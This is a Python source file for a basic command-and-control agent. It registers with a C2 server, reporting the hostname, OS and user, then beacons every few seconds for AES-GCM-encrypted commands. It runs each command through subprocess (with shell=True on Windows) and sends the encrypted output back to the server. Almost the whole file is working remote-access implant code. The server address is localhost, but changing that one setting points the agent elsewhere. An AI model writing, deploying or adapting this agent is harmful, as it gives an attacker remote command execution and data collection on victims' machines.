# Basic C2 Agent with AES-GCM Encryption
# Ensure 'cryptography' library is installed: pip install cryptography
import requests
import time
import subprocess
import json
import platform
import uuid
import os
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from typing import Optional, Any # For type hinting

# Configuration - Adjust these as needed
C2_URL = "https://localhost:8443"
VERIFY_SSL = False
BEACON_INTERVAL = 10
AGENT_ID = None
ENCRYPTION_KEY_HEX = None # Will store the hex-encoded AES key from C2

# Suppress InsecureRequestWarning if VERIFY_SSL is False
if not VERIFY_SSL:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
        "user": os.getenv('USER') or os.getenv('USERNAME')
    }

# --- Agent Side Encryption/Decryption ---
def agent_encrypt_data(key_hex: str, data_to_encrypt: Any) -> Optional[str]:
    if not key_hex:
        print("Error: Encryption key not set for agent.")
        return None
    try:
        key_bytes = bytes.fromhex(key_hex)
        aesgcm = AESGCM(key_bytes)
        nonce = os.urandom(12) # AES-GCM standard nonce size

        if isinstance(data_to_encrypt, (dict, list)):
            plaintext_bytes = json.dumps(data_to_encrypt).encode('utf-8')
        elif isinstance(data_to_encrypt, bytes):
            plaintext_bytes = data_to_encrypt
        else: # Convert other types to string first
            plaintext_bytes = str(data_to_encrypt).encode('utf-8')

        ciphertext_bytes = aesgcm.encrypt(nonce, plaintext_bytes, None) # No associated data (AAD)
        nonce_and_ciphertext = nonce + ciphertext_bytes
        return base64.b64encode(nonce_and_ciphertext).decode('utf-8')
    except Exception as e:
        print(f"Agent encryption error: {e}")
        return None

def agent_decrypt_data(key_hex: str, b64_ciphertext: str) -> Optional[Any]:
    if not key_hex:
        print("Error: Encryption key not set for agent.")
        return None
    try:
        key_bytes = bytes.fromhex(key_hex)
        aesgcm = AESGCM(key_bytes)

        nonce_and_ciphertext = base64.b64decode(b64_ciphertext)
        nonce = nonce_and_ciphertext[:12] # Assuming 12-byte nonce
        ciphertext_bytes = nonce_and_ciphertext[12:]

        plaintext_bytes = aesgcm.decrypt(nonce, ciphertext_bytes, None) # No AAD
        plaintext = plaintext_bytes.decode('utf-8')

        try:
            return json.loads(plaintext) # Attempt to parse as JSON
        except json.JSONDecodeError:
            return plaintext # Return as plain string if not JSON
    except Exception as e:
        print(f"Agent decryption error: {e}")
        return None

def register_agent():
    global AGENT_ID, ENCRYPTION_KEY_HEX
    try:
        payload = {"initial_data": get_system_info()}
        print(f"Attempting to register with C2: {C2_URL}/register")
        response = requests.post(f"{C2_URL}/register", json=payload, verify=VERIFY_SSL, timeout=15)
        response.raise_for_status()
        data = response.json()
        if data.get("agent_id") and data.get("encryption_key"):
            AGENT_ID = data["agent_id"]
            ENCRYPTION_KEY_HEX = data["encryption_key"] # Store the hex key
            print(f"Agent registered. AGENT_ID: {AGENT_ID}. Encryption key received.")
            return True
        else:
            print(f"Failed to get agent_id or encryption_key from registration: {data}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Registration request failed: {e}")
        return False
    except json.JSONDecodeError as e:
        print(f"Error decoding registration JSON response: {e} - Response: {response.text[:200]}")
        return False

def send_beacon():
    if not AGENT_ID or not ENCRYPTION_KEY_HEX:
        print("Agent not registered or key missing. Cannot send beacon.")
        return None
    try:
        # Beacon payload itself is not encrypted, C2 identifies agent by AGENT_ID in plaintext
        payload = {"agent_id": AGENT_ID}
        response = requests.post(f"{C2_URL}/beacon", json=payload, verify=VERIFY_SSL, timeout=15)
        response.raise_for_status()

        # Expects C2 response like: {"data": "BASE64_ENCRYPTED_COMMAND_OR_STATUS"}
        response_data = response.json()
        encrypted_command_data = response_data.get("data")

        if encrypted_command_data:
            decrypted_command = agent_decrypt_data(ENCRYPTION_KEY_HEX, encrypted_command_data)
            # print(f"Decrypted command/status from C2: {decrypted_command}") # For debugging
            return decrypted_command # This is the actual command dict or status dict
        else:
            print(f"Beacon response does not contain 'data' field or is empty: {response.text[:100]}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"Beacon request failed: {e}")
        return None
    except json.JSONDecodeError as e:
        print(f"Beacon response not JSON or malformed: {e} - Response: {response.text[:200]}")
        return None


def execute_command(command_details: dict):
    if not AGENT_ID or not ENCRYPTION_KEY_HEX: # Ensure key is available
        print("Agent not registered or key missing. Cannot execute command.")
        return

    command = command_details.get("command")
    command_id = command_details.get("id") # C2 sends 'id'

    if not command:
        print("No command string found in command details.")
        send_command_output(command_id or "unknown_cmd_id", command or "[No command provided]", "[ERROR] Agent received no command string.")
        return

    print(f"Executing command_id '{command_id}': {command}")
    output_str = ""
    try:
        if platform.system() == "Windows":
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='replace')
        else:
            proc = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='replace')
        stdout, stderr = proc.communicate(timeout=30)
        if stdout: output_str += stdout
        if stderr: output_str += f"\n[ERROR]\n{stderr}"
        if proc.returncode != 0 and not output_str:
            output_str = f"[No output] Command exited with return code: {proc.returncode}"
        elif not output_str:
             output_str = "[No output]"
    except subprocess.TimeoutExpired:
        output_str = "[ERROR] Command execution timed out."
    except FileNotFoundError:
        output_str = f"[ERROR] Command not found: {command.split()[0] if command else 'N/A'}"
    except Exception as e:
        output_str = f"[ERROR] Command execution failed: {e}"
    print(f"Output for {command_id}: {output_str[:100]}...")
    send_command_output(command_id, command, output_str)

def send_command_output(command_id: str, command_sent: str, output: str):
    if not AGENT_ID or not ENCRYPTION_KEY_HEX:
        print("Agent not registered or key missing. Cannot send command output.")
        return

    # Payload to be encrypted
    payload_to_encrypt = {"command_id": command_id, "output": output}
    encrypted_output_b64 = agent_encrypt_data(ENCRYPTION_KEY_HEX, payload_to_encrypt)

    if not encrypted_output_b64:
        print(f"Failed to encrypt output for command_id '{command_id}'. Cannot send.")
        return

    # Final payload to C2
    final_payload_to_c2 = {"agent_id": AGENT_ID, "encrypted_data": encrypted_output_b64}

    try:
        response = requests.post(f"{C2_URL}/cmd_output", json=final_payload_to_c2, verify=VERIFY_SSL, timeout=15)
        response.raise_for_status()

        # Process encrypted ACK from C2
        ack_response_data = response.json()
        encrypted_ack = ack_response_data.get("data")
        if encrypted_ack:
            decrypted_ack = agent_decrypt_data(ENCRYPTION_KEY_HEX, encrypted_ack)
            print(f"Decrypted ACK from C2 for command_id '{command_id}': {decrypted_ack}")
        else:
            print(f"ACK response from C2 for '{command_id}' does not contain 'data': {response.text[:100]}")

    except requests.exceptions.RequestException as e:
        print(f"Failed to send command output for '{command_id}': {e}")
    except json.JSONDecodeError as e:
        print(f"ACK response for '{command_id}' not JSON: {e} - Response: {response.text[:200]}")


if __name__ == "__main__":
    print("Starting basic C2 agent (with encryption)...")

    registration_success = False
    retry_count = 0
    max_retries = 3
    while not registration_success and retry_count < max_retries:
        if register_agent():
            registration_success = True
        else:
            retry_count += 1
            if retry_count < max_retries:
                print(f"Retrying registration in {BEACON_INTERVAL} seconds... (Attempt {retry_count}/{max_retries})")
                time.sleep(BEACON_INTERVAL)
            else:
                print("Agent registration failed after multiple attempts. Exiting.")
                exit(1)

    if not registration_success: # Should be caught by exit(1) above, but as safeguard
        exit(1)

    print(f"Agent operational. Beaconing every {BEACON_INTERVAL} seconds to {C2_URL}")
    try:
        while True:
            beacon_command_data = send_beacon() # This is now the decrypted command/status object
            if beacon_command_data and isinstance(beacon_command_data, dict):
                if beacon_command_data.get("command"):
                    execute_command(beacon_command_data)
                # else:
                    # print(f"Beacon status: {beacon_command_data.get('status')}") # e.g. no_command
            time.sleep(BEACON_INTERVAL)
    except KeyboardInterrupt:
        print("\nAgent shutting down.")
    except Exception as e:
        print(f"An unexpected error occurred in the main loop: {e}")

```
